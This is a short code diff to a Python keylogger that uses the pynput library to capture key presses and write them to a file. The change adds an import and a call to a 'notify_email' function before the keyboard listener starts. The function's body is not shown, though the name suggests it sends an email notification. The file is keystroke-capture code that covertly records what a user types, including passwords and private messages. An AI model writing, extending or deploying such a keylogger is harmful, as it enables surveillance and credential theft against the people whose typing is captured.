@@ -1,6 +1,8 @@
 #imported from required library pynput
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
+from notify import notify_email
+
 
 count = 0
 keys = []
@@ -31,5 +33,6 @@ def write_file(keys):
             elif key.find("Key"):
                 f.write(key)
 
+notify_email()
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
